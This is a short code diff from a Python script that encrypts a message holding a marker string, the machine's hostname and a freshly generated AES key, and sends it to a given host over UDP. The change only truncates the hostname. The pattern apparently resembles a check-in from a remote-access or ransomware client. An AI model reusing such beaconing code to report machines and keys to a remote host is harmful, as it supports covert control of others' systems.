@@ -13,7 +13,7 @@ except ImportError as e:
 def main(HOST, PORT, CIPHER, tryAgain = 6):
 
 	AES_key = Random.new().read(32)
-	msg = CIPHER.encrypt("3317BLT5_#_{0}_#_{1}\n".format(socket.gethostname(), hexlify(AES_key).decode()).encode())
+	msg = CIPHER.encrypt("3317BLT5_#_{0}_#_{1}\n".format(socket.gethostname()[:32], hexlify(AES_key).decode()).encode())
 
 	# As you can see, there is no connect() call; UDP has no connections.
 	# Instead, data is directly sent to the recipient via sendto().
